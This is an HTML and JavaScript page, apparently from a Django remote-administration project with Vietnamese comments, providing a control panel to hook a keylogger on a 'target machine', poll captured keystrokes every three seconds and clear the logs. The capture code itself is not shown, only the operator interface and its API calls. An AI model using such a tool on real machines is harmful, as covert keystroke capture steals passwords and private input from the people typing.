<main data-page="keylogger">
    <div class="px-4 pt-6">
        <div class="p-4 bg-white border border-gray-200 rounded-lg shadow-sm dark:border-gray-700 sm:p-6 dark:bg-gray-800">
            <div class="items-center justify-between mb-4 lg:flex">
                <div class="mb-4 lg:mb-0">
                    <h3 class="mb-2 text-xl font-bold text-gray-900 dark:text-white">Keylogger</h3>
                    <span class="text-base font-normal text-gray-500 dark:text-gray-400">Monitor and capture keyboard input from target machine</span>
                </div>
                <div class="flex items-center space-x-3">
                    
                    <button id="hookBtn" onclick="toggleHook()" 
                        class="inline-flex items-center px-3 py-2 text-sm font-medium text-center text-gray-900 bg-white border border-gray-300 rounded-lg hover:bg-gray-100 focus:ring-4 focus:ring-gray-200 dark:bg-gray-700 dark:text-white dark:border-gray-600 dark:hover:bg-gray-600 dark:focus:ring-gray-700 transition-colors">
                        <svg class="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z" clip-rule="evenodd"></path>
                        </svg>
                        Hook
                    </button>
                    
                    <button onclick="getKeylogData()" 
                        class="inline-flex items-center px-3 py-2 text-sm font-medium text-center text-gray-900 bg-white border border-gray-300 rounded-lg hover:bg-gray-100 focus:ring-4 focus:ring-gray-200 dark:bg-gray-700 dark:text-white dark:border-gray-600 dark:hover:bg-gray-600 dark:focus:ring-gray-700 transition-colors">
                        <svg class="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd"></path>
                        </svg>
                        Get Data
                    </button>
                    
                    <button onclick="clearKeylog()" 
                        class="inline-flex items-center px-3 py-2 text-sm font-medium text-center text-white rounded-lg bg-red-600 hover:bg-red-700 focus:ring-4 focus:ring-red-300 dark:focus:ring-red-800 transition-colors">
                        <svg class="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M9 2a1 1 0 00-.894.553L7.382 4H4a1 1 0 000 2v10a2 2 0 002 2h8a2 2 0 002-2V6a1 1 0 100-2h-3.382l-.724-1.447A1 1 0 0011 2H9zM7 8a1 1 0 012 0v6a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v6a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                        </svg>
                        Clear
                    </button>
                </div>
            </div>

            <div class="mb-4">
                <label class="inline-flex items-center cursor-pointer">
                    <input type="checkbox" id="autoUpdate" onchange="toggleAutoUpdate()" class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <span class="ms-2 text-sm font-medium text-gray-900 dark:text-gray-300">Auto update every 3 seconds</span>
                </label>
            </div>
            
            <div class="flex flex-col mt-4">
                <div class="overflow-hidden rounded-lg border border-gray-200 dark:border-gray-700">
                    <textarea 
                        id="keylogArea" 
                        style="height: 200px; max-height: 600px; overflow-y: auto;"
                        class="w-full px-4 py-3 font-mono text-sm bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 resize-none" 
                        readonly 
                        placeholder="Keylog data will appear here..."></textarea>
                </div>
            </div>
        </div>
    </div>
</main>

<script>
    // --- 1. CLEANUP TIMER ---
    if (window.keylogPollingTimer) {
        clearTimeout(window.keylogPollingTimer);
        window.keylogPollingTimer = null;
    }

    let isHooked = false; 

    // --- 2. HÀM INIT ---
    function initKeyloggerPage() {
        if (!document.querySelector('[data-page="keylogger"]')) return;
        
        console.log("INIT KEYLOGGER PAGE");
        
        // Khôi phục trạng thái Checkbox
        const savedAutoUpdate = localStorage.getItem('keylog_auto_update') === 'true';
        const checkbox = document.getElementById('autoUpdate');
        if (checkbox) checkbox.checked = savedAutoUpdate;

        // Check trạng thái Server
        checkInitialStatus().then(() => {
            if (savedAutoUpdate) toggleAutoUpdate();
        });
    }

    // --- 3. HELPER FUNCTIONS (ĐƯỢC ĐỊNH NGHĨA TRỰC TIẾP ĐỂ TRÁNH LỖI) ---
    
    // Hàm lấy Cookie (Cho CSRF Token)
    function getKeylogCookie(name) {
        let cookieValue = null;
        if (document.cookie && document.cookie !== '') {
            const cookies = document.cookie.split(';');
            for (let i = 0; i < cookies.length; i++) {
                const cookie = cookies[i].trim();
                if (cookie.substring(0, name.length + 1) === (name + '=')) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }

    // Hàm gọi API (Có xử lý CSRF và Error Handling)
    async function apiCall(url, method='GET', body=null) {
        const headers = {'Content-Type': 'application/json'};
        const token = getKeylogCookie('csrftoken'); // Luôn gửi CSRF để an toàn
        if (token) headers['X-CSRFToken'] = token;

        const options = { method, headers };
        if (body) options.body = JSON.stringify(body);
        
        try {
            const res = await fetch(url, options);
            // Nếu Server trả về lỗi 400/500/403, fetch không throw mà trả về res.ok = false
            if (!res.ok) {
                return { status: 'error', message: `HTTP Error ${res.status}` };
            }
            return await res.json();
        } catch (err) {
            console.error("API Error:", err);
            return { status: 'error', message: err.message || 'Connection Error' };
        }
    }

    // --- 4. CORE LOGIC ---

    async function checkInitialStatus() {
        try {
            // 
            // Sơ đồ này minh họa trình tự kiểm tra trạng thái ban đầu: Client gửi request -> Server kiểm tra status -> Trả về JSON -> Client cập nhật UI
            const res = await apiCall('/remote/api/keylog/status/');
            if (res && res.status === 'success') {
                isHooked = (res.data === 'RUNNING');
            } else {
                isHooked = false;
            }
        } catch(e) { 
            isHooked = false; 
        } finally {
            updateHookButton();
            // Đồng bộ LocalStorage
            if (isHooked) {
                localStorage.setItem('KEYLOG_HOOKED', 'true');
                getKeylogData();
            } else {
                localStorage.removeItem('KEYLOG_HOOKED');
            }
        }
    }

    async function toggleHook() {
        // Kiểm tra đã connect server chưa
        if (!localStorage.getItem('connectedServer')) {
            showNotification("error", "Please connect to a server first");
            return;
        }
        
        const hookBtn = document.getElementById('hookBtn');
        if(hookBtn) {
            hookBtn.innerHTML = `Wait...`; 
            hookBtn.disabled = true;
        }

        const action = isHooked ? 'UNHOOK' : 'HOOK';
        
        try {
            const res = await apiCall('/remote/api/keylog/hook/', 'POST', {action: action});
            
            if (res.status === 'success') {
                isHooked = !isHooked;
                showNotification("success", isHooked ? 'Keylogger started' : 'Keylogger stopped');
            } else {
                showNotification("error", res.message || 'Failed to toggle keylogger');
            }
        } catch (e) {
            // Lỗi này giờ chỉ hiện khi thực sự có vấn đề JS nghiêm trọng
            console.error(e);
            showNotification("error", "An unexpected error occurred");
        } finally {
            updateHookButton();
            if(hookBtn) hookBtn.disabled = false;

            if (isHooked) localStorage.setItem('KEYLOG_HOOKED', 'true');
            else localStorage.removeItem('KEYLOG_HOOKED');
        }
    }

    function updateHookButton() {
        const hookBtn = document.getElementById('hookBtn');
        if (!hookBtn) return;
        
        if (isHooked) {
            hookBtn.className = 'inline-flex items-center px-3 py-2 text-sm font-medium text-center text-white rounded-lg bg-red-600 hover:bg-red-700 transition-colors';
            hookBtn.innerHTML = `<svg class="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8 7a1 1 0 00-1 1v4a1 1 0 001 1h4a1 1 0 001-1V8a1 1 0 00-1-1H8z" clip-rule="evenodd"></path></svg> Unhook`;
        } else {
            hookBtn.className = 'inline-flex items-center px-3 py-2 text-sm font-medium text-center text-gray-900 bg-white border border-gray-300 rounded-lg hover:bg-gray-100 dark:bg-gray-700 dark:text-white dark:border-gray-600 transition-colors';
            hookBtn.innerHTML = `<svg class="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z" clip-rule="evenodd"></path></svg> Hook`;
        }
    }

    async function clearKeylog() {
        if (confirm('Delete all logs?')) {
            await apiCall('/remote/api/keylog/clear/', 'POST');
            document.getElementById('keylogArea').value = '';
        }
    }

    async function getKeylogData() {
        if (!document.querySelector('[data-page="keylogger"]')) return;

        const res = await apiCall('/remote/api/keylog/get/');
        if (res.status === 'success') {
            const area = document.getElementById('keylogArea');
            if (area && area.value !== res.data) {
                area.value = res.data || '';
                area.scrollTop = area.scrollHeight;
            }
        }
    }

    function toggleAutoUpdate() {
        const checkbox = document.getElementById('autoUpdate');
        if (!checkbox) return;

        const isChecked = checkbox.checked;
        localStorage.setItem('keylog_auto_update', isChecked);
        
        if (window.keylogPollingTimer) {
            clearTimeout(window.keylogPollingTimer);
            window.keylogPollingTimer = null;
        }

        if (isChecked) {
            const runLoop = async () => {
                if (!document.querySelector('[data-page="keylogger"]')) return;
                const currentCheck = document.getElementById('autoUpdate');
                if (!currentCheck || !currentCheck.checked) return;
                
                await getKeylogData();
                window.keylogPollingTimer = setTimeout(runLoop, 3000);
            };
            runLoop();
        }
    }

    // Trigger Init
    document.addEventListener('htmx:afterSwap', initKeyloggerPage);
    document.addEventListener('DOMContentLoaded', initKeyloggerPage);
</script>
